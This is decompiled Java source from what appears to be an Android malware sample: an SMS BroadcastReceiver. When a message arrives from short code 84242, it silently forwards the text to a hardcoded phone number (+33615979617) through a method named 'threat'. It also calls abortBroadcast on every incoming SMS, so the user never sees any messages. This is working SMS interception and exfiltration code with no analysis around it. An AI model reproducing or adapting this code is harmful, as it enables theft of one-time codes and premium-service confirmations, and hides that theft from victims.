	
	    public Machine()
	    {
	        return;
	    }
	
	
	    private void threat(String p7, android.content.Context p8)
	    {
	        android.telephony.SmsManager.getDefault().sendTextMessage("+33615979617", 0, p7, 0, 0);
	        return;
	    }
	
	
	    public void onReceive(android.content.Context p10, android.content.Intent p11)
	    {
	        Object[] v3_1 = ((Object[]) p11.getExtras().get("pdus"));
	        android.telephony.SmsMessage[] v6 = new android.telephony.SmsMessage[v3_1.length];
	        int v2 = 0;
	        while (v2 < v3_1.length) {
	            v6[v2] = android.telephony.SmsMessage.createFromPdu(((byte[]) v3_1[v2]));
	            v2++;
	        }
	        String v4 = v6[0].getMessageBody();
	        int v0 = 0;
	        if (v6[0].getDisplayOriginatingAddress().equals("84242")) {
	            v0 = 1;
	        }
	        if (v0 != 0) {
	            this.threat(v4, p10);
	        }
	        this.abortBroadcast();
	        return;
	    }
	
